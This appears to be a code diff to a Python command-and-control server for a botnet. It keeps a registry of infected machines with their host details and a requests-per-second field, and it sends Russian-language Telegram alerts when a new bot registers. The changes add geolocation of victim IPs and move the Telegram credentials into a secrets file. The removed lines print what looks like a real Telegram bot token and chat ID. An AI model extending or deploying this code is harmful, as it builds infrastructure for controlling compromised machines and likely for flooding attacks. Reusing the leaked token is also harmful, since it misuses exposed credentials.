@@ -1,13 +1,20 @@
 #!/usr/bin/env python3
-import asyncio, json, os, time, subprocess
+import asyncio, json, os, time, subprocess, requests
 from datetime import datetime
 
 HTTP_PORT = 80
 BOTS_FILE = "bots.json"
 COMMANDS_FILE = "commands.json"
 
-TELEGRAM_TOKEN = "8801568177:AAG8KfuLv79gJ0VEhL85QwmOB4OL9R1KNto"
-TELEGRAM_CHAT_ID = "2119367196"
+def load_secret(key):
+    try:
+        with open("secrets.json") as f:
+            return json.load(f).get(key, "")
+    except:
+        return ""
+
+TELEGRAM_TOKEN = load_secret("telegram_token")
+TELEGRAM_CHAT_ID = load_secret("telegram_chat_id")
 
 def telegram_notify(msg):
     if not (TELEGRAM_TOKEN and TELEGRAM_CHAT_ID):
@@ -20,6 +27,15 @@ def telegram_notify(msg):
         ], timeout=5)
     except:
         pass
+
+def get_country(ip):
+    try:
+        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=countryCode", timeout=2)
+        if resp.status_code == 200:
+            return resp.json().get("countryCode", "")
+    except:
+        pass
+    return ""
 
 bots = {}
 if os.path.exists(BOTS_FILE):
@@ -107,19 +123,21 @@ async def handle_client(reader, writer):
         cpu = info.get("cpu", "")
         ram = info.get("ram", "")
         is_new = ip not in bots
+        country = get_country(ip) if is_new else bots[ip].get("country", "")
         bots[ip] = {
             "ip": ip,
             "hostname": hostname,
             "os": os_info,
             "cpu": cpu,
             "ram": ram,
+            "country": country,
             "status": "online",
             "rps": 0,
             "last_seen": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         }
         save_bots()
         if is_new:
-            telegram_notify(f"🟢 Новый бот: {ip} ({hostname})")
+            telegram_notify(f"🟢 Новый бот: {ip} ({hostname}, {os_info})")
         writer.write(b"registered")
     await writer.drain()
     writer.close()
